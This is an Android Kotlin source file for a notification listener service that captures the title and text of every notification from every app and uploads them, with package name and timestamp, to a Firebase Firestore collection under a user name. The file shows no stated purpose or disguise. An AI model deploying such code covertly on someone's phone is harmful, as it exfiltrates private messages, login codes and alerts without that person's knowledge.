package com.example

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore

class NotificationReaderService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        try {
            sbn?.let {
                val packageName = it.packageName ?: "unknown"
                val extras = it.notification?.extras

                val title = extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString()
                    ?: extras?.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()
                    ?: ""

                val text = extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                    ?: extras?.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                    ?: ""

                val prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE)
                val userName = prefs.getString("USER_NAME", "unknown") ?: "unknown"

                if (title.isNotBlank() || text.isNotBlank()) {
                    val db = FirebaseFirestore.getInstance()
                    val notificationData = hashMapOf(
                        "package" to packageName,
                        "title" to title,
                        "text" to text,
                        "timestamp" to System.currentTimeMillis()
                    )
                    
                    // Add to a subcollection for the user
                    db.collection("notifications").document(userName)
                        .collection("logs").add(notificationData)
                        .addOnSuccessListener {
                            Log.d("NotificationReader", "Notification saved to Firebase successfully")
                        }
                        .addOnFailureListener { e ->
                            Log.e("NotificationReader", "Error saving notification to Firebase", e)
                        }
                }
            }
        } catch (e: Throwable) {
            Log.e("NotificationReader", "Safe catch: error reading notification", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}

